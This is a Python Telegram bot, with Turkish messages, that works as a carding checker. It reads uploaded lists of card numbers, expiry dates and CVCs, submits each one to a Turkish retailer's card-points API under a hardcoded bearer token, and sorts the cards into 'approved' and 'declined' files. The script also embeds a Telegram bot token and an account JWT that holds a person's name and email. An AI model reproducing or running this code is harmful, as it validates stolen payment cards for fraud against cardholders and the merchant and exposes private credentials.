import telebot
import requests
import json
import hashlib
import time
import io

# Bot token'ını buraya girin
BOT_TOKEN = '8479006692:AAFhMZRBK__zL32Kzdh8cFNE0NofMmaMF7s'

bot = telebot.TeleBot(BOT_TOKEN)

headers = {
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json',
    'Authorization': 'Bearer eyJhbGciOiJSUzUxMiIsImtpZCI6IjM2ODgyMyIsInR5cCI6ImF0K2p3dCJ9.eyJpc3MiOiJodHRwczovL2dpcmlzLnBhemFyYW1hLmNvbSIsIm5iZiI6MTc1NDkzNTI1MCwiaWF0IjoxNzU0OTM1MjUwLCJleHAiOjE3NTQ5MzcwNTAsInNjb3BlIjpbIm9wZW5pZCIsInByb2ZpbGUiLCJlbWFpbCIsInBhemFyYW1hd2ViLmZ1bGxhY2Nlc3MiLCJvZmZsaW5lX2FjY2VzcyJdLCJhbXIiOlsicHdkIl0sImNsaWVudF9pZCI6InBhemFyYW1hLnByb2R1Y3Rpb24ubW9iaWxld2ViY2xpZW50LmF1dGhvcml6YXRpb25fY29kZSIsInN1YiI6ImE4MzExZmVmLTIyMjEtNGI5Yy01NDRjLTA4ZGRjZTRjNmZhOCIsImF1dGhfdGltZSI6MTc1NDc1ODc2MCwiaWRwIjoibG9jYWwiLCJjbGllbnRfdHlwZSI6IjIiLCJjbGllbnRfZ3JvdXBfdHlwZSI6IjAiLCJmaXJzdF9uYW1lIjoiU2luYW4iLCJsYXN0X25hbWUiOiJZXHUwMEY2clx1MDBGQ2siLCJlbWFpbCI6IndpZml1c2JhbGNhbUBnbWFpbC5jb20iLCJ1bmlxdWVfdXNlcl9pZCI6IjJlNzY4M2YyLWIyNzQtNDEzMi1hN2QwLTE2NTkwYzRhYmIyNSIsInVpZHMiOiJ7XHUwMDIyMFx1MDAyMjpcdTAwMjJhODMxMWZlZi0yMjIxLTRiOWMtNTQ0Yy0wOGRkY2U0YzZmYThcdTAwMjJ9IiwiY3VzdG9tZXJfdHlwZSI6IjAiLCJpc19hZHVsdCI6ImZhbHNlIiwicm9sZSI6IlBhemFyYW1hIiwic2lkIjoiRUZFNDdEMDExNjk5MUJBMjNDREJDQURDRjg2OENDNEYiLCJqdGkiOiI3MEY3Rjc0QzJEQURFNTBBMUFFMkQxOTcxODAyQUMzMyJ9.kYnpqVWDYDugqeax_IuzOfd7mUKkBZ_hEVFz1Lv1FS5SaqrQ875lJFEd8Xtno1rx_a7W_BOELp6TAhTyw0IwBs9p11vMbsqk1-dWMKK6VIS7PxcOvSDNBOg5UU4u_Ut02KJS7fi67RFJh_DNkAQFJ4i81Er81AutDYamEYD6aodTt77gXlBJJL0UO7zQstfSuSw1O4W1xrXFYDldLREXVr3Ae2y7zDT9rXiqnYHrKr_tef6iJa2POSreQgL2BeMjqiUIX4t62Pq9HImO3VJqPQKhgNkeD4ODuoFmhGDgybVH-4Q7G7jyAsydZQA53aAWMyJ14663LxRm0Gp7HCMJKw',
    'OrderType': '1',
    # 'X-Payload-Hash' will be computed dynamically
    'X-Channel-Code': '10',
    'X-CompanyCode': '1',
    'X-Platform': '1',
    'x-lang-code': 'tr',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_11 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/137.0.7151.79 Mobile/15E148 Safari/604.1',
    'Referer': 'https://www.pazarama.com/sepetim/odeme',
}

@bot.message_handler(commands=['check'])
def start_check(message):
    bot.reply_to(message, "Merhaba kanka! 😎 Kartları kontrol etmek için TXT dosyasını at, her satır şu formatta olsun: kartnumarası|ay|yıl|cvc (Örnek: 0123456789123456|03|28|000) 📝")
    bot.register_next_step_handler(message, handle_document)

def handle_document(message):
    if message.content_type != 'document' or not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "Hoppala! 🙁 Lütfen geçerli bir TXT dosyası at, kanka. Tekrar dene! 🔄")
        bot.register_next_step_handler(message, handle_document)
        return

    bot.reply_to(message, "Dosya geldi, süper! 🚀 Kartları hızlıca kontrol ediyorum, biraz bekle... ⏳")

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    cards = downloaded_file.decode('utf-8').splitlines()

    approved = []
    declined = []

    for card_line in cards:
        card_line = card_line.strip()
        if not card_line:
            continue

        parts = card_line.split('|')
        if len(parts) != 4:
            declined.append(f'"{card_line}", "Declined ❌", "0,00 TL"')
            continue

        cardnum, mm, yy, cvc = parts
        mm = mm.zfill(2)
        if len(yy) == 2:
            yy = '20' + yy
        cvc = cvc.zfill(3)

        json_data = {
            'CardInfo': {
                'CardNumber': cardnum,
                'ExpMonth': mm,
                'ExpYear': yy,
                'CvcNumber': cvc,
            },
            'PointType': 1,
        }

        # Compute X-Payload-Hash
        payload_str = json.dumps(json_data, separators=(',', ':'))
        headers['X-Payload-Hash'] = hashlib.sha256(payload_str.encode('utf-8')).hexdigest()

        try:
            response = requests.post('https://bff.pazarama.com/v2/me/card/point/v2', headers=headers, json=json_data)
            data = response.json()

            # Puanı al ve formatla
            point_str = str(data.get('point', '0,00')).replace(',', '.').replace(' TL', '')
            try:
                point = float(point_str)
                point_formatted = f"{point:,.2f}".replace('.', ',') + " TL"
            except ValueError:
                point = 0.0
                point_formatted = "0,00 TL"

            if point > 0:
                approved.append(f'"{card_line}", "Approved ✅", "{point_formatted}"')
            else:
                declined.append(f'"{card_line}", "Declined ❌", "0,00 TL"')
        except Exception as e:
            declined.append(f'"{card_line}", "Declined ❌", "0,00 TL"')

        time.sleep(0.5)  # Her kart için 0.5 saniye bekle

    # Approved TXT dosyası
    if approved:
        approved_content = '\n'.join(approved).encode('utf-8')
        bot.send_document(message.chat.id, ('approved.txt', approved_content), caption='İşte onaylanan kartlar! 🎉')
    else:
        bot.reply_to(message, "Ups, hiç onaylanmış kart yok! 😕")

    # Declined TXT dosyası
    if declined:
        declined_content = '\n'.join(declined).encode('utf-8')
        bot.send_document(message.chat.id, ('declined.txt', declined_content), caption='Reddedilen kartlar burada. 😔')
    else:
        bot.reply_to(message, "Süper, hiç reddedilen kart yok! 🥳")

    bot.reply_to(message, "Kontrol bitti kanka, başka ne yapalım? 😎")

if __name__ == '__main__':
    bot.polling()
